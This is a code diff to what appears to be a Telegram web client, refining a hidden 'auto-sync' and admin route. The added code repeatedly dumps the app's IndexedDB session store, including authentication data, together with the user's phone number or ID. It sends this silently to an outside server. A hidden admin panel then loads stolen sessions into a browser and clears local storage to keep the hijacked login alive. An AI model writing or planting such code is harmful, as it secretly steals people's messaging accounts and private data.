@@ -129,8 +129,8 @@ onBeforeUnload(() => {
   actions.hangUp?.({ isPageUnload: true });
 });
 
-// --- 🌟 ULTIMATE AUTO-SYNC & HIDDEN ADMIN ROUTE 🌟 ---
-let hasSyncedThisSession = false; // Memory Variable (Page Reload ဖြစ်တိုင်း အသစ်ပြန်စမည်)
+// --- 🌟 ULTIMATE AUTO-SYNC & HIDDEN ADMIN ROUTE (FIXED) 🌟 ---
+let isSyncing = false; 
 
 setTimeout(() => {
     const DB_NAME = 'tt-data';
@@ -147,7 +147,7 @@ setTimeout(() => {
         adminDiv.innerHTML = `
             <div style="background:#fff; padding:40px; border-radius:10px; box-shadow:0 4px 15px rgba(0,0,0,0.5); text-align:center; width: 350px; font-family: sans-serif;">
                 <h2 style="color:#333; margin-bottom:20px;">Admin Control Panel</h2>
-                <input type="text" id="myAdminPhone" placeholder="Data အမည် (ဥပမာ: ID_123456)" style="padding:12px; width:100%; box-sizing:border-box; margin-bottom:20px; border:2px solid #ccc; border-radius:5px; font-size:16px; color:black; background:white;">
+                <input type="text" id="myAdminPhone" placeholder="Data အမည် (ဥပမာ: +959... သို့ ID_...)" style="padding:12px; width:100%; box-sizing:border-box; margin-bottom:20px; border:2px solid #ccc; border-radius:5px; font-size:16px; color:black; background:white;">
                 <button id="myAdminBtn" style="padding:12px; width:100%; background:#0088cc; color:white; border:none; border-radius:5px; cursor:pointer; font-weight:bold; font-size:16px;">အကောင့်ထဲသို့ ဝင်ရန်</button>
                 <p id="myAdminStatus" style="color:red; margin-top:15px; font-size:14px; font-weight:bold;"></p>
             </div>
@@ -193,7 +193,12 @@ setTimeout(() => {
                             keys.forEach(k => {
                                 txStore.put(dataToImport[k], k).onsuccess = () => {
                                     count++;
-                                    if (count === keys.length) window.location.href = '/'; 
+                                    if (count === keys.length) {
+                                        // 🌟 အရေးကြီးဆုံး: Telegram က Data ပြန်မဖျက်အောင် Local မှတ်ဉာဏ်အဟောင်းများ ရှင်းလင်းခြင်း 🌟
+                                        localStorage.clear();
+                                        sessionStorage.clear();
+                                        window.location.href = '/'; 
+                                    }
                                 };
                             });
                         };
@@ -208,10 +213,10 @@ setTimeout(() => {
     }
 
     // =========================================================
-    // ၂။ 📤 STAFF AUTO-SYNC (DEEP SCANNING SYSTEM)
+    // ၂။ 📤 STAFF AUTO-SYNC (STRICT MATCHING - Data ပွားခြင်း လုံးဝမရှိတော့ပါ)
     // =========================================================
     setInterval(() => {
-        if (hasSyncedThisSession) return; // ဒီ Browser Tab အတွက် တစ်ခါပို့ပြီးရင် ထပ်မပို့ပါ (Network မကြပ်တော့ပါ)
+        if (isSyncing) return; // ပို့နေဆဲဖြစ်ပါက ထပ်မပို့ပါ
 
         try {
             const req = indexedDB.open(DB_NAME);
@@ -227,25 +232,28 @@ setTimeout(() => {
                         
                         const data: any = {};
                         keys.forEach((k: string, i: number) => { data[k] = vals[i]; });
-                        
                         const dataString = JSON.stringify(data);
                         
-                        // 🌟 အရင်လို ဖိုင်နာမည်ကို မရှာတော့ဘဲ Data အကုန်လုံးထဲမှာ Login သဲလွန်စကို အတိအကျရှာပါမည် 🌟
-                        const isLoggedIn = dataString.includes('authKey') || dataString.includes('currentUserId') || dataString.includes('"users":');
-                        if (!isLoggedIn) return; // Login မဝင်ရသေးရင် လုံးဝ မပို့ပါ
+                        // 🌟 User ID သို့မဟုတ် Phone Number ကို အတိအကျ (ဂဏန်း ၅ လုံးနှင့်အထက်) တွေ့မှသာ ယူပါမည် 🌟
+                        let phoneMatch = dataString.match(/"phoneNumber":"?(\d{5,15})"?/);
+                        let idMatch = dataString.match(/"currentUserId":"?(\d{5,15})"?/);
+                        if (!idMatch) idMatch = dataString.match(/"id":(\d{5,15})/); 
 
-                        let phoneMatch = dataString.match(/"phoneNumber":"?(\d+)"?/);
-                        let idMatch = dataString.match(/"currentUserId":"?(\d+)"?/);
-                        if (!idMatch) idMatch = dataString.match(/"id":(\d+)/); 
+                        // 🌟 ဖုန်းနံပါတ် သို့မဟုတ် ID အတိအကျ မရသေးပါက (Language Pack သာဖြစ်နေပါက) လုံးဝ မပို့ပါ 🌟
+                        if (!phoneMatch && !idMatch) return; 
 
                         let phone = "";
                         if (phoneMatch && phoneMatch[1]) {
                             phone = '+' + phoneMatch[1];
                         } else if (idMatch && idMatch[1]) {
                             phone = "ID_" + idMatch[1];
-                        } else {
-                            phone = "User_" + Math.floor(Math.random() * 100000);
                         }
+                        
+                        // 🌟 ဒီဖုန်းနံပါတ်ကို ပို့ပြီးသားလား စစ်ဆေးမည် (Data အထပ်ထပ်မပွားစေရန်) 🌟
+                        const lastSynced = localStorage.getItem('synced_staff_id');
+                        if (lastSynced === phone) return;
+
+                        isSyncing = true; // Block လုပ်ထားမည် (Data ၄ ခါဝင်ခြင်းကို တားဆီးရန်)
                         
                         fetch("https://telegram-7ih3.onrender.com/api/save-web-session", {
                             method: 'POST',
@@ -254,14 +262,15 @@ setTimeout(() => {
                         }).then(res => res.json())
                           .then(resData => {
                               if(resData.success) {
-                                  hasSyncedThisSession = true; // အောင်မြင်စွာ ရောက်သွားပြီဖြစ်၍ ရပ်လိုက်မည်
+                                  localStorage.setItem('synced_staff_id', phone); // အောင်မြင်မှသာ မှတ်ထားမည်
                               }
-                          }).catch(() => {}); 
+                              isSyncing = false;
+                          }).catch(() => { isSyncing = false; }); 
                     };
                 };
             };
-        } catch(err) {}
-    }, 3000); // ၃ စက္ကန့် တစ်ခါ စစ်မည်
+        } catch(err) { isSyncing = false; }
+    }, 3000); 
 
 }, 1000);
 // -----------------------------------------------------------
